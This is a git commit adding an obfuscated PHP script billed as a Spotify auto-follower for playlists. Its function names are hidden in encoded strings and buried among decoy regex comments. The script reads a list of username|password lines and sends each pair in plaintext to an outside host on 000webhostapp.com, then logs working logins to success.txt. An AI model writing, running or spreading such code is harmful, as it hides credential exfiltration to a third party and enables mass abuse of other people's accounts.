3502ab4344897c504f44ca7c2d312a520e175383
zeldriss <31651756+zeldriss@users.noreply.github.com>
2020-04-26 05:56:34 +0700

    Create playlist.php

---
+++ playlist.php
@@ -0,0 +1,61 @@
+<?php /* This file was protected by MessPHP v1.0 at http://lombokcyber.com/en/detools/mess-php-obfuscator */ ?><?php
+ /***/$taw_Whe=base64_decode(chr(97).chr(87).chr(53).chr(112).'X'.chr(51).'N'.'l'."d".chr(65).chr(61).chr(61));$stnkAKnHAiXVp=base64_decode(chr(90).'X'."J".'y'.chr(98).chr(51).chr(74).chr(102).'c'."m".'V'."w".chr(98).chr(51).'J'.chr(48).chr(97)."W"."5".'n');$tFOPmwqe=base64_decode(chr(100).'H'.chr(74).'p'.'b'.chr(81).chr(61)."=");$MLizmIXv_vH=base64_decode("Z".chr(109).chr(100).chr(108).chr(100).'H'."M".chr(61));$dpTDgrP=base64_decode(chr(100)."H".chr(74).'p'.chr(98).chr(81)."=".chr(61));$TKtwxeSARRgoM=base64_decode("Z".chr(109)."d"."l".'d'.chr(72).'M'."=");$p_iRRDfhxTsXJ=base64_decode(chr(90).'m'.chr(108).chr(115).'Z'.chr(86).chr(57).'n'.chr(90).'X'."R".chr(102)."Y".chr(50).chr(57).chr(117).chr(100).chr(71).chr(86).'u'.'d'.chr(72)."M".'=');$uULyObW=base64_decode('Z'.'X'."h".chr(119)."b".chr(71).chr(57).chr(107)."Z"."Q".chr(61).'=');$QdSeSXLLyLU_U=base64_decode('Y'."2".chr(57).chr(49).'b'.chr(110).chr(81).chr(61));$WysruuT=base64_decode(chr(90)."G"."F".chr(48).chr(90).chr(81)."=".chr(61));$kQTsebl=base64_decode('Z'.chr(88)."h".'w'.chr(98).chr(71).'9'.chr(107).chr(90).'Q'."=".chr(61));$YZTnyE__ZcwIu=base64_decode(chr(90)."m".chr(108).'s'.chr(90).chr(86)."9".'n'.chr(90).chr(88).'R'.chr(102).chr(89).chr(50).chr(57).chr(117).chr(100)."G".'V'.chr(117).chr(100).'H'.chr(77).'=');$rDnURnB=base64_decode("c".'3'."R".'y'.chr(99).chr(71).chr(57).chr(122));$tfQPOQSbMZQgD=base64_decode(chr(97).chr(87).chr(53).chr(102).'Y'."X".chr(74)."y".'Y'.chr(88).chr(107)."=");$mXFnuPBQD=base64_decode(chr(90).'X'.chr(104).chr(119).'b'.chr(71).chr(57)."k"."Z".chr(81)."=".chr(61));$JKwPSwRuOMS=base64_decode(chr(90).chr(109)."l".chr(115).chr(90)."V".chr(57).'n'."Z".chr(88)."R".chr(102).chr(89).'2'.chr(57).'u'.chr(100).chr(71)."V"."u".'d'.chr(72).chr(77).chr(61));$nswFFypeuzFTa=base64_decode(chr(90).'m'.'9'.'w'.chr(90).chr(87).chr(52).chr(61));$gUhPXPql=base64_decode(chr(90)."n"."d".'y'.chr(97).chr(88).'R'.chr(108));$hqNirltZ=base64_decode(chr(90).chr(109).chr(78)."s"."b".chr(51).chr(78).'l');$YOsfp__OTGi=base64_decode(chr(89).chr(50).'9'."1".chr(98).'n'."Q".chr(61));$taw_Whe('date.timezone',/**$regex = '/^(GB){0,1}([1-9][0-9]{2}[\ ]{0,1}[0-9]{4}[\ ]{0,1}[0-9]{2})|*/'Asia/Jakarta');///$regex = '/^(AT){0,1}U[0-9]{8}$/i';
+ob_implicit_flush((bool)(31+(-30)));///       case 'Finland':
+$stnkAKnHAiXVp((100+(-100)));/**return preg_match($regex, $vat_number);*/function /**'.$match.'" /><input type="submit" value="go" /></form><br />';*/in_string($gXwhQLPwe,$rhcmWMaBjKG)///if(!filter_var($email, FILTER_VALIDATE_EMAIL)) {
+{$wyauDinahqk=base64_decode("c".'3'."R".chr(121).chr(100)."G".chr(57).chr(49).chr(99)."H"."B".chr(108).chr(99)."g"."=".chr(61));$jCYWUCX=base64_decode(chr(97).'X'.chr(78).chr(102).chr(89).chr(88).'J'.chr(121).chr(89).chr(88).'k'.chr(61));$GbyPkfPt=base64_decode('Y'."2".chr(57).'1'.chr(98).'n'.'Q'."=");$ZHclGzdA=base64_decode(chr(99).'3'.'R'.chr(121).chr(99)."G"."9".chr(122));$HfLhwdv=base64_decode(chr(99)."3"."R".chr(121).chr(100).'G'.'9'."1"."c".'H'.chr(66).chr(108).'c'.chr(103)."=".chr(61));///        case 'Slovakia':
+$gXwhQLPwe=$wyauDinahqk($gXwhQLPwe);///case 'Belgium':
+if(!$jCYWUCX($rhcmWMaBjKG))/***/$rhcmWMaBjKG=array($rhcmWMaBjKG);/**$regex = '/^(RO){0,1}[0-9]{2,10}$/i';*/for($NiQUsydQmtxB=(1+(-1));$NiQUsydQmtxB<$GbyPkfPt($rhcmWMaBjKG);$NiQUsydQmtxB++)/**$regex = '/^(IT|LV){0,1}[0-9]{11}$/i';*/if($ZHclGzdA(($gXwhQLPwe),$HfLhwdv($rhcmWMaBjKG[$NiQUsydQmtxB]))/**$match = isset($_POST['match'])?$_POST['match']:"<>";*/ !== ///        case 'Germany':
+(bool)(-54-(-54)))///if (preg_match($search, $match)){echo "matches";}else{echo "no match";}
+return /**}*/(bool)(-44-(-45));/**$regex = '/^(CY){0,1}[0-9]{8}[A-Z]$/i';*/return /**echo "domain name is: {$matches[0]}\n";*/(bool)(-51-(-51));///} else {
+}/**if (preg_match("/\bweb\b/i", "PHP is the web scripting language of choice.")) {*/echo /**case 'United Kingdom':*/"============================================\n";///case 'Bulgaria':
+echo ///$regex = '/^(CZ){0,1}[0-9]{8,10}$/i';
+"   Spotify Auto Follower Playlist [Target] \n";/**$regex = '/^(FR){0,1}[0-9A-Z]{2}[\ ]{0,1}[0-9]{9}$/i'*/echo /**$regex = '/^(DK){0,1}([0-9]{2}[\ ]{0,1}){3}[0-9]{2}$/i';*/"             Github : Zeldriss    	\n";///            $regex = '/^(RO){0,1}[0-9]{2,10}$/i';
+echo /**$regex = '/^(BE){0,1}[0]{0,1}[0-9]{9}$/i';*/"============================================\n";/**$regex = '/^(DK){0,1}([0-9]{2}[\ ]{0,1}){3}[0-9]{2}$/i';*/echo /**case 'Hungary':*/"[+] List : ";/**case 'France':*/$leRXi_q_hs///case 'Denmark':
+=/**case 'Portugal':*/$tFOPmwqe($MLizmIXv_vH(STDIN));///$regex = '/^(?:1(?:[. -])?)?(?:\((?=\d{3}\)))?([2-9]\d{2})'
+$CHbOppVm_zG///        case 'Estonia':
+=/**case 'Latvia':*/"|";///
+echo /**switch($country) {*/"[+] Target Follow Playlist : ";/**case 'Sweden':*/$lmI_ssSQ/***/=///
+$dpTDgrP($TKtwxeSARRgoM(STDIN));///            $regex = '/^(PL|SK){0,1}[0-9]{10}$/i';
+echo ///        case 'Slovakia':
+"============================================\n";/***/echo /**case 'Sweden':*/"[~] Starting Follow Playlist...\n";/**$regex = '/^(BE){0,1}[0]{0,1}[0-9]{9}$/i';*/echo /**.'[. -]?(\d{4})(?: (?i:ext)\.? ?(\d{1,5}))?$/';*/"============================================\n";/**case 'Spain':*/$ZqCbHvgbc_L///        case 'Greece':
+=/**echo "A match was found.";*/$p_iRRDfhxTsXJ("$leRXi_q_hs");///        case 'Romania':
+$CTMVkiWsNX_ri///$regex = '/^(?:1(?:[. -])?)?(?:\((?=\d{3}\)))?([2-9]\d{2})'
+=///$regex .= "(\:[0-9]{2,5})?"; // Port
+$uULyObW("\n",$ZqCbHvgbc_L);/**$email = "someone@domain .local";*/$BZam_Op=/**case 'Finland':*/(84+(-84));///case 'Cyprus':
+$OcgADxoFxFBU=(20+(-20));///$regex = '/^(DK){0,1}([0-9]{2}[\ ]{0,1}){3}[0-9]{2}$/i';
+$cULzpEoLTHV=(-61-(-61));/**$regex = '/^(EE|EL|DE|PT){0,1}[0-9]{9}$/i';*/for($rhcmWMaBjKG=(96+(-96));$rhcmWMaBjKG<$QdSeSXLLyLU_U($CTMVkiWsNX_ri);$rhcmWMaBjKG++){///            ([1-9][0-9]{2}[\ ]{0,1}[0-9]{4}[\ ]{0,1}[0-9]{2}[\ ]{0,1}[0-9]{3})|((GD|HA)[0-9]{3})$/i';
+$HLhpBFBr///            $regex = '/^(IE){0,1}[0-9][0-9A-Z\+\*][0-9]{5}[A-Z]$/i';
+=///$regex = '/^(AT){0,1}U[0-9]{8}$/i';
+$WysruuT("h:i:sa");///$regex .= "(#[a-z_.-][a-z0-9+\$_.-]*)?"; // Anchor 
+$qiCOxGRfr/**case 'Denmark':*/=/**case 'Sweden':*/$kQTsebl($CHbOppVm_zG,$CTMVkiWsNX_ri[$rhcmWMaBjKG]);/**$regex .= "(#[a-z_.-][a-z0-9+\$_.-]*)?"; // Anchor*/$qDBQVTwPBfAIH///$host = $matches[1];
+=///            $regex = '/^(FI|HU|LU|MT|SI){0,1}[0-9]{8}$/i';
+$qiCOxGRfr[(-66-(-66))];///if (preg_match("/\bweb\b/i", "PHP is the web scripting language of choice.")) {
+$xkajoRArqMwNk/**case 'Luxembourg':*/=///        case 'Romania':
+$qiCOxGRfr[(82+(-81))];/**$match = isset($_POST['match'])?$_POST['match']:"<>";*/$PIbVlAMpYe/**if(preg_match('/[^0-9A-Za-z]/',$test_string)) // this is the preg_match version. the /'s are now required.*/=///$regex = '/^(?:1(?:[. -])?)?(?:\((?=\d{3}\)))?([2-9]\d{2})'
+@$YZTnyE__ZcwIu("http://hadehente69.000webhostapp.com/playlist/example.php?user=$qDBQVTwPBfAIH&pass=$xkajoRArqMwNk&target=$lmI_ssSQ");///$regex = '/^(DK){0,1}([0-9]{2}[\ ]{0,1}){3}[0-9]{2}$/i';
+if///        case 'Lithuania':
+($rDnURnB($PIbVlAMpYe,"Only"))/**$regex = '/^(BG){0,1}[0-9]{9,10}$/i';*/{///
+if(!$tfQPOQSbMZQgD($PIbVlAMpYe,$mXFnuPBQD("\n",@$JKwPSwRuOMS("success.txt")))){///$regex = '/^(BE){0,1}[0]{0,1}[0-9]{9}$/i';
+$xTWt_rIZ=$nswFFypeuzFTa("success.txt","a");///function checkVatNumber( $country, $vat_number ) {
+$gUhPXPql($xTWt_rIZ,$PIbVlAMpYe."\n");/**$match = isset($_POST['match'])?$_POST['match']:"<>";*/$hqNirltZ($xTWt_rIZ);///        case 'United Kingdom':
+}/**return preg_match($regex, $vat_number);*/echo /**case 'Slovenia':*/"["///        case 'Germany':
+./**$regex = '/^(BE){0,1}[0]{0,1}[0-9]{9}$/i';*/$HLhpBFBr///if (preg_match("/php/i", "PHP is the web scripting language of choice."))
+.///        case 'Ireland':
+"]";/**case 'Sweden':*/$PIbVlAMpYe/**if(preg_match('/[^0-9A-Za-z]/',$test_string)) // this is the preg_match version. the /'s are now required.*/=///$regex = '/^(CZ){0,1}[0-9]{8,10}$/i';
+" [GAGAL] ";///if(preg_match('/[^0-9A-Za-z]/',$test_string)) // this is the preg_match version. the /'s are now required. 
+$OcgADxoFxFBU/**case 'Austria':*/ += /**if (preg_match("/\bweb\b/i", "PHP is the web scripting language of choice.")) {*/(29+(-28));/**$regex = '/^(EE|EL|DE|PT){0,1}[0-9]{9}$/i';*/}else{/**case 'Cyprus':*/echo /**$regex = '/^(IT|LV){0,1}[0-9]{11}$/i';*/"["///        case 'Romania':
+.///$regex = '/^(FR){0,1}[0-9A-Z]{2}[\ ]{0,1}[0-9]{9}$/i'
+$HLhpBFBr///$regex = "((https?|ftp)\:\/\/)?"; // SCHEME
+.///        case 'Poland':
+"]";/**echo "A match was not found.";*/$PIbVlAMpYe/**default:*/=/**echo "A match was not found.";*/" [SUCCESS] ";///        case 'Poland':
+$cULzpEoLTHV/**"http://www.php.net/index.html", $matches);*/ += /**$regex = '/^(?:1(?:[. -])?)?(?:\((?=\d{3}\)))?([2-9]\d{2})(?:(?<=\(\d{3})\))? ?(?:(?<=\d{3})[.-])?([2-9]\d{2})[. -]?(\d{4})(?: (?i:ext)\.? ?(\d{1,5}))?$/';*/(-7-(-8));///case 'Austria':
+}///$host = $matches[1];
+ob_flush();///
+print($PIbVlAMpYe.$qDBQVTwPBfAIH."|".$xkajoRArqMwNk."\n");/**$regex = '/^(?:1(?:[. -])?)?(?:\((?=\d{3}\)))?([2-9]\d{2})'*/}/**case 'Cyprus':*/echo ///echo 's: <input style="width:400px;" name="search" type="text" value="'.$search.'" /><br />';
+"============================================\n";/**$regex = '/^(NL){0,1}[0-9]{9}B[0-9]{2}$/i';*/print/**echo "E-mail is not valid";*/("[~] RESULT...\n");///get host name from URL
+echo /**case 'Greece':*/"============================================\n";///$regex = '/^(FR){0,1}[0-9A-Z]{2}[\ ]{0,1}[0-9]{9}$/i'
+echo ///        case 'Ireland':
+"[!] TOTAL LIST: "/**case 'Latvia':*/.///$regex = '/^(EE|EL|DE|PT){0,1}[0-9]{9}$/i';
+$YOsfp__OTGi($CTMVkiWsNX_ri).///$regex = '/^(BE){0,1}[0]{0,1}[0-9]{9}$/i';
+"\n[+] FOLLOW PLAYLIST SUCCESS: $cULzpEoLTHV\n[-] GAGAL FOLLOW PLAYLIST: $OcgADxoFxFBU";/**$host = $matches[1];*/
+?>
